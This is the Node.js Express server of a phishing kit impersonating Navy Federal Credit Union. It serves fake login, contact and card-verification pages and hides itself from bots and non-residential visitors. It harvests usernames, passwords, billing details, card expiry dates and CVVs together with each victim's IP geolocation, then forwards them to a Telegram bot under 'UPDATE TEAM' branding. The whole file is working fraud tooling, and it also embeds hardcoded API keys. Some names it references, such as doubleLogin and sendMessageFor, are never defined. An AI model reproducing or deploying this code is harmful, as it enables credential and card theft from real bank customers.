const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const axios = require("axios");
const fs = require("fs").promises;
const { getClientIp } = require("request-ip");

const rateLimiter = require("./middleware/rateLimiter");
const { detectBotMiddleware, fetchGeoIpData, isAllowed } = require("./middleware/antibot");
const residentialISPs = require("./middleware/residentialISPs");
const { botToken, chatId, url } = require("./config/settings.js");

const app = express(); 
const PORT = process.env.PORT || 3000;
const API_KEY = "bdc_d2f555c61bc54fe48b238633858dc30c";

console.log(`Server running at: ${url}`);

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(rateLimiter);
app.use(detectBotMiddleware);

const viewDir = path.join(__dirname, 'views');

async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_13bbc1ea73db483b856f22acc6c6d427`);
  return response.data;
}

// IP Filtering Middleware
app.use(async (req, res, next) => {
  const ipAddress = getClientIp(req);
  if (await isAllowed(ipAddress)) {
    next();
  } else {
    res.redirect('https://ionos.com')
  }
});

app.get('/login', async (req, res) => {
  try {
    const htmlContent = await fs.readFile(path.join(viewDir, 'login.html'), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route for verify page
app.get('/verify', (req, res) => { 
  const action = req.query.action;
  const verifyPages = {
    '1': 'contact.html',
    '2': 'card.html'
  };

  const page = verifyPages[action] || 'login';
  res.sendFile(path.join(viewDir, page));
});

app.get('/', (req, res) => res.redirect('/login')); 

// Receive Data and Send to Telegram
app.post('/receive', async (req, res) => {
  let message = '';
  const myObject = req.body;
  const ipAddress = getClientIp(req) || "127.0.0.1";
  
	
  try {
    
    const geoInfo = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    
    const myObjectKeys = Object.keys(myObject).map(key => key.toLowerCase());
    const fullGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\nCity: ${geoInfo.location.city}\nState: ${geoInfo.location.principalSubdivision}\nZIP: ${geoInfo.location.postcode}\nCountry: ${geoInfo.country.name}\nTime: ${geoInfo.location.timeZone.localTime}\nISP: ${geoInfo.network.organisation}\n\n`;
    const basicGeoInfo = `🌍 GEO-IP INFO\nIP: ${geoInfo.ip}\nCoordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}\n\n`;

    const prepareMessage = (header, type, includeFullGeo = false) => {
      message += `👤 ${header}\n========================\n`;
      Object.keys(myObject).forEach(key => {
        if (key.toLowerCase() !== 'visitor' && myObject[key]) {
          message += `${key.toUpperCase()}: ${myObject[key]}\n`;
        }
      });
      message += `\n========================\n\n` + (includeFullGeo ? fullGeoInfo : basicGeoInfo) + `========================\n\n✅ UPDATE TEAM | NAVY FEDERAL\n💬 Telegram: https://t.me/updteams\n`;

      res.send({ url: type });
    };
    
    
if (myObjectKeys.includes('user') && myObject.click === 1 && doubleLogin) {
  prepareMessage("RE-LOGIN", "/verify?action=1", true);
} else if (myObjectKeys.includes('user') && myObject.click === 0 && doubleLogin) {
  prepareMessage("LOGIN", "err", false);
} else if (myObjectKeys.includes('user') && !doubleLogin) {
  prepareMessage("LOGIN", "/verify?action=1", false);
} else if (myObjectKeys.includes('city') || myObjectKeys.includes('lastname')) {
  prepareMessage("BILLING INFO", "/verify?action=2", false);
} else if (myObjectKeys.includes('expirydate') || myObjectKeys.includes('cvv') || myObjectKeys.includes('billingzip')) {
  prepareMessage("ACCOUNT INFO", url, false);
} else {
  res.status(400).send({ error: "No matching keys found in request body." });
}

    const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
    console.log(message);

  } catch (error) {
    res.status(500).send({ error: "Internal server error" });
    console.error(error);
  }
});


// Start Server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
